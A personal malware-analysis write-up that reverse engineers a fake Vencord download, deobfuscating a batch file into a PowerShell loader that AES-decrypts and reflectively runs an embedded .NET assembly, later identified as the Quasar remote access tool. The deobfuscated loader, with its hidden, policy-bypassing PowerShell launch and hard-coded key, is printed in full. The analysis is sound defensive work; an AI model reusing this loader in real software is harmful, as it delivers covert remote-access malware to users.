# Intro

This document is all about my adventure reverse engineering the fake download at https://vencord.lol/.

Vencord is a client modification for Discord. It's offical website is https://vencord.dev/. Many impersonation websites have popped up,
such as https://vencord.app/ and the now-taken-down https://vencord.xyz/. These have popped enough for me to make a [Vencord Impersonation Reporter](https://github.com/MrDiamondDog/Vencord-Impersonation-Reporter)-
which scans every TLD (Top Level Domain) named "vencord". It runs every day and eventually found this website.

## Vencord.lol

On 3/28/2024, Imperonsation Reporter found vencord.lol, and when I went to investigae, it was an almost exact copy of vencord.dev. No other buttons
worked other than the download button, which redirected you to https://ven.lol/. There is nothing on this page except for a very ominous "[cilck to enter]" (clicking does nothing)

![image](https://gist.github.com/assets/84212701/bdd977c4-a55b-483a-b972-6aabe3f2bc1f)

After a while, it downloads a file just named "Loader.zip". Running it through VirusTotal finds nothing, so I opened it. Inside, there are only 2 files:

![image](https://gist.github.com/assets/84212701/bce802a8-81fa-4253-a9b4-20f687c1192f)

A text file named "Enjoy!.txt" with no content, and a Loader.bat.

## Obfuscation Layer #1: Loader.bat

Running this file obviously seemed like a bad idea, so I did the next logical solution: editing it.

This is what the file looks like.

![image](https://gist.github.com/assets/84212701/534e7aae-84d7-42d1-adf2-626443e8aed0)

This goes on for about 5,000 lines, 16,000,000 characters.

Investigating further (asking chatgpt) discovered that all the really long lines are variable declarations:

`%hUJIgPwfGgrrCrsQKqFLYzLieMkgbqdaShWtGLtgygfmzwglVXXqSLBHiBDtEqeqcryvuZjYXzmRuzIHGYkdsNhgFokeiZBibPjhYKRVNZttzKnISWNFfbYpksQfOfQX:hUJIgOwgGgqqCqrPKpGLYzLidMkgbpdaRhXuGLugygglzxglVYXpRLBHiBDuFpdpcqyvvZjYXzmQuzIHGYkdrMhgFokdiZBibOjhYKQWNZuuzJnIRWNGfaYokrPf=%"RUXFUMhIjw%XeQE%o "`

Everything before the equals sign is garbage to obfuscate the data more. It ends up resolving to a previously defined variable that contains `set `
This means that everything after the equals is actually a `set` operation.

The set data looks like this: `"RUXFUMhIjw%XeQE%o "`. 
Everything before the `%XeQE%` is the name of the variable, and everything after is what to set it to.
So in this case, `RUXFUMhIjw = "o "`

The entire file is separated into blocks of definitions and lines that look like this: `%pBJVhoptuN%%HVbBllmVca%%RUXFUMhIjw%%vuTJtrmSyQ%%LEVwLUemUE%`.
These lines are combining all the previous variables into a command, that the batch file executes.

After figuring this out, I realized this would be *really* easy to write a de-obfuscator for. So I made this in TypeScript:

```ts
import fs from "fs";

const definitionRegex = /%[A-z]{128}:[A-z]{124}=%"(.*)%XeQE%(.*)"/;
const subDefinitionRegex = /%[A-z]{4}%"([A-z]{10})=(.*)"/;
const variableRegex = /%([A-z]*)%/g;

const text = fs.readFileSync(process.argv[2], { encoding: "utf-8" });
const lines = text.split("\n");

function resolveVars(str: string) {
    return str.replace(variableRegex, (match, p1) => {
        return definitions[p1] || match;
    });
}

const definitions: Record<string, string> = {};
const commands: string[] = [];
let i = 0;
for (const line of lines) {
    const match = line.match(definitionRegex);
    // definition
    if (match) {
        definitions[match[1]] = match[2];
        console.log(i, "def:", match[1], "=", match[2])
    } else {
        const parts = line.split("%").filter(Boolean);
        let command = "";
        for (const part of parts) {
            if (definitions[part]) {
                command += definitions[part];
            }
        }

        command = resolveVars(command);

        const subMatch = command.match(subDefinitionRegex);
        if (subMatch) {
            definitions[subMatch[1]] = subMatch[2];
            console.log(i, "def:", subMatch[1], "=", subMatch[2]);
        } else {
            commands.push(command);
            console.log(i, "cmd: ", command);
        }
    }

    i++;
}

// resolve variables
for (let i = 0; i < commands.length; i++) {
    commands[i] = resolveVars(commands[i]);
    commands[i] = commands[i].replace(/\t/g, "\n");
}

console.log(commands.join("\n"));
```
(This is the final version- images shown may be in older versions of this script)

It's pretty messy, but it works. Putting the first definition-execution block into the input file and running it produced this output:

![image](https://gist.github.com/assets/84212701/e5c4d73c-f685-476c-8324-04cc4545b094)

The first line is the command it's running: `@echo off`. This means that my approach works, so this layer of obfuscation is broken.

## Layer 2: `set` in `set`

Running the same code for more def-exec blocks resulted in this:

![image](https://gist.github.com/assets/84212701/8ffbb7da-cef3-4b1a-bf95-406b166fe7c3)

So all of this ended up setting MORE variables to parts of the code, hence why this section is called `set` in `set`. `set` operations were
used to obfuscate commands, most of the commands being more `set` operations. So, I modified the code to allow for nested definitions.

After that, I ran it against the whole bat file, and this was the output.

![image](https://gist.github.com/assets/84212701/01b662fa-5d33-4cc9-a0ed-b655c7293feb)

The unobfuscated script:

```bat
@echo off
set "bDOC=set "
set "PzoZ=set "
cd /d %systemdrive%
set "xNSUVcbVfZ=function cabZc($wDNPY){
$dpSWX=[System.Security.Cryptography.Aes]::Create();
$dpSWX.Mode=[System.Security.Cryptography.CipherMode]::CBC;
$dpSWX.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
$dpSWX.Key=[System.Convert]::('@F@r@o@m@B@a@s@e@6@4@S@t@r@i@n@g@'.Replace('@', ''))('ywZ4zbvE94p0AjJdsJquIr8OfpJvLV5TpDK8RHDCawA=');
$dpSWX.IV=[System.Convert]::('@F@r@o@m@B@a@s@e@6@4@S@t@r@i@n@g@'.Replace('@', ''))('gWYwrnLwvaEVn5azmkls4A==');
$duCkl=$dpSWX.CreateDecryptor();
$return_var=$duCkl.TransformFinalBlock($wDNPY, 0, $wDNPY.Length);
$duCkl.Dispose();
$dpSWX.Dispose();
$return_var;}function xHmqd($wDNPY){
$taHbo=New-Object System.IO.MemoryStream(,$wDNPY);
$KwYWp=New-Object System.IO.MemoryStream;
Invoke-Expression '$qFHGG @=@ @N@e@w@-@O@b@j@e@c@t@ @S@y@s@t@e@m@.@I@O@.@C@o@m@p@r@e@s@s@i@o@n@.@G@Z@i@p@S@t@r@e@a@m@(@$taHbo,@ @[@I@O@.@C@o@m@p@r@e@s@s@i@o@n@.@C@o@m@p@r@e@s@s@i@o@n@M@o@d@e@]@:@:@D@e@c@o@m@p@r@e@s@s@)@;@'.Replace('@', '');
$qFHGG.CopyTo($KwYWp);
$qFHGG.Dispose();
$taHbo.Dispose();
$KwYWp.Dispose();
$KwYWp.ToArray();}function bfsQm($wDNPY,$LMHlt){
$tDdAS = @(

'$Tcpjt = [System.@R@e@f@l@e@c@t@i@o@n@.Assembly]::@L@o@a@d@([byte[]]$wDNPY);'.Replace('@', ''),

'$YkCzb = $Tcpjt.EntryPoint;',

'$YkCzb.Invoke($null, $LMHlt);'
);
foreach ($WjSSe in $tDdAS) {

Invoke-Expression $WjSSe
};}$LvKNb=[System.IO.File]::('@R@e@a@d@A@l@l@T@e@x@t@'.Replace('@', ''))('%~f0').Split([Environment]::NewLine);foreach ($uzAOr in $LvKNb) {
if ($uzAOr.StartsWith('MROXEN'))
{

$foRxM=$uzAOr.Substring(6);

break;
}}$gIiYE=xHmqd (cabZc ([Convert]::('@F@r@o@m@B@a@s@e@6@4@S@t@r@i@n@g@'.Replace('@', ''))($foRxM)));bfsQm $gIiYE (,[string[]] ('%~f0'));" & echo Invoke-Expression $env:xNSUVcbVfZ; | %systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -noprofile -windowstyle hidden > nul
cls
exit /b
```

It was very clear this bat file was executing a powershell script, with even more layers of obfuscation.

## Layer 3: The Powershell Script

This script was obfuscated in multiple, smaller ways. The variable and function names were random strings, accesses to some properties were
obfuscated with tons of @ symbols, and it was formatted very poorly. The formatted script looks like this:

```ps1
function cabZc($wDNPY){
    $dpSWX=[System.Security.Cryptography.Aes]::Create();
    $dpSWX.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $dpSWX.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
    $dpSWX.Key=[System.Convert]::("FromString")('ywZ4zbvE94p0AjJdsJquIr8OfpJvLV5TpDK8RHDCawA=');
    $dpSWX.IV=[System.Convert]::("FromString")('gWYwrnLwvaEVn5azmkls4A==');
    $duCkl=$dpSWX.CreateDecryptor();
    $return_var=$duCkl.TransformFinalBlock($wDNPY, 0, $wDNPY.Length);
    $duCkl.Dispose();
    $dpSWX.Dispose();
    $return_var;
}
function xHmqd($wDNPY){
    $taHbo=New-Object System.IO.MemoryStream(,$wDNPY);
    $KwYWp=New-Object System.IO.MemoryStream;
    Invoke-Expression '$qFHGG = New-Object System.IO.Compression.GZipStream($taHbo, [IO.Compression.CompressionMode]::Decompress);';
    $qFHGG.CopyTo($KwYWp);
    $qFHGG.Dispose();
    $taHbo.Dispose();
    $KwYWp.Dispose();
    $KwYWp.ToArray();
}
function bfsQm($wDNPY,$LMHlt){
    $tDdAS = @(
    '$Tcpjt = [System.Reflection.Assembly]::Load([byte[]]$wDNPY);',
    '$YkCzb = $Tcpjt.EntryPoint;',
    '$YkCzb.Invoke($null, $LMHlt);'
    );
    foreach ($WjSSe in $tDdAS) {
        Invoke-Expression $WjSSe
    };
}

$LvKNb=[System.IO.File]::('ReadAllText')('%~f0').Split([Environment]::NewLine);

foreach ($uzAOr in $LvKNb) {
    if ($uzAOr.StartsWith('MROXEN'))
    {
        $foRxM=$uzAOr.Substring(6);
        break;
    }
}
$gIiYE=xHmqd (cabZc ([Convert]::('FromBase64String')($foRxM)));bfsQm $gIiYE (,[string[]] ('%~f0'));
```

This script can be broken down into a few steps:

- Goes back to the batch file and reads a line starting with "MROXEN"
- Decrypts the line with AES
- Reads this into a memory stream
- Executes it with `System.Reflection.Assembly`.

The first step led me to one line in the bat file. The line is 14,835,807 characters long.

## Layer 4: The Assembly

This is what I believe is the final layer. (i love spreading misinformation)

After some research, I figured out this was a .NET assembly being run. So if I could put this into a DLL somehow, I could have tools like dnSpy or ilSpy look at it.
I did a ton of work to get this to work, which I will skip since it isn't very relevant, but all that matters is I ended up with this c# script:

```cs
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using System.Xml.Linq;

class Program
{
	static void Main(string[] args)
	{
		string byteFilePath = "path/to/bytes.txt";
		string dllFilePath = "GeneratedAssembly.dll";

		// Read bytes from file
		byte[] bytes = File.ReadAllBytes(byteFilePath);

		Console.WriteLine("Loaded " + bytes.Length + " bytes");

		// Create assembly
		AssemblyName assemblyName = new AssemblyName("GeneratedAssembly");
		AssemblyBuilder assemblyBuilder = AssemblyBuilder.DefinePersistedAssembly(assemblyName, typeof(object).Assembly);
		ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("GeneratedModule");

		Console.WriteLine("Assembly created successfully.");

		// Define type
		TypeBuilder typeBuilder = moduleBuilder.DefineType("GeneratedType", TypeAttributes.Public);

		// Define method
		MethodBuilder methodBuilder = typeBuilder.DefineMethod("Generate", MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[0]);
		ILGenerator ilGenerator = methodBuilder.GetILGenerator();

		Console.WriteLine("IL Generation Started");

		// Generate IL to load bytes and perform operations
		for (int i = 0; i < bytes.Length; i++)
		{
			if (i % 10000 == 0)
			{
				Console.WriteLine(i + "/" + bytes.Length);
			}
			ilGenerator.Emit(OpCodes.Ldc_I4, bytes[i]); // Load byte onto the stack
			ilGenerator.Emit(OpCodes.Call, typeof(Console).GetMethod("WriteLine", new Type[] { typeof(int) })); // Call Console.WriteLine to output the byte
		}
		ilGenerator.Emit(OpCodes.Ret); // Return from method

		Console.WriteLine("IL Generation Complete");

		// Create type and save assembly
		Type generatedType = typeBuilder.CreateType();
		assemblyBuilder.Save(dllFilePath);

		Console.WriteLine("Assembly generated successfully.");
	}
}
```

This spit out a DLL file that ilSpy should be able to read. So I dragged it in, and it started deassembling it. And it was stuck loading forever, taking
up 40gb of ram. Then I tried dnSpy, but it did the same thing. Clearly I was doing something wrong.

## The Final Layer: Dear God What Is This (5/24/2024)

I asked ChatGPT 4o to use this document to help me decrypt this stupid assembly.

Somehow, it worked. This is the (surprisingly simple) script it came up with, using 2 functions that were created by the file originally:

```ps1
function cabZc($wDNPY) {
    $dpSWX=[System.Security.Cryptography.Aes]::Create();
    $dpSWX.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $dpSWX.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
    $dpSWX.Key=[System.Convert]::FromBase64String('ywZ4zbvE94p0AjJdsJquIr8OfpJvLV5TpDK8RHDCawA=');
    $dpSWX.IV=[System.Convert]::FromBase64String('gWYwrnLwvaEVn5azmkls4A==');
    $duCkl=$dpSWX.CreateDecryptor();
    $return_var=$duCkl.TransformFinalBlock($wDNPY, 0, $wDNPY.Length);
    $duCkl.Dispose();
    $dpSWX.Dispose();
    $return_var;
}

function xHmqd($wDNPY) {
    $taHbo=New-Object System.IO.MemoryStream(,$wDNPY);
    $KwYWp=New-Object System.IO.MemoryStream;
    $qFHGG = New-Object System.IO.Compression.GZipStream($taHbo, [IO.Compression.CompressionMode]::Decompress);
    $qFHGG.CopyTo($KwYWp);
    $qFHGG.Dispose();
    $taHbo.Dispose();
    $KwYWp.ToArray();
}

$encryptedData = [Convert]::FromBase64String("YourBase64StringHere");
$decryptedData = cabZc $encryptedData;
$decompressedData = xHmqd $decryptedData;

[System.IO.File]::WriteAllBytes("assembly.dll", $decompressedData);
```

Loading this into dnSpy worked immediately.

Unfortunately, it looked like this:

![image](https://gist.github.com/assets/84212701/ed96b3e7-6767-4de5-8314-9d956927bab6)
![image](https://gist.github.com/assets/84212701/f3961c26-4dad-4433-9c68-c1fffa110d3d)
![image](https://gist.github.com/assets/84212701/0a284a8b-27d9-4418-895d-c3ef0cec0545)

Considering the sheer amount of obfuscation in this dll, there is absolutely no way to read this. I'm not even going to attempt to understand any of this.

## UPDATE: 8/2/2024

I found a forensic analysis site called [Triage](https://tria.ge/), and ran Loader.bat through that. I'll let the results speak for itself.

![image](https://gist.github.com/user-attachments/assets/65528370-a82c-4e4e-9e0c-e18f6f04c11c)

It's a Remote Access Tool called Quasar. I'm not sure how the other tools missed this, but I'm glad this one could catch it.

You can view the full results [here](https://tria.ge/240802-x6xf1ssamf/behavioral2).

# The (real) End

We now actually know what it is, and that you definitely should not run it. I'm glad I finally got to the end of this ~~rabbit~~ RAT hole cause I was very curious what was at the bottom of it.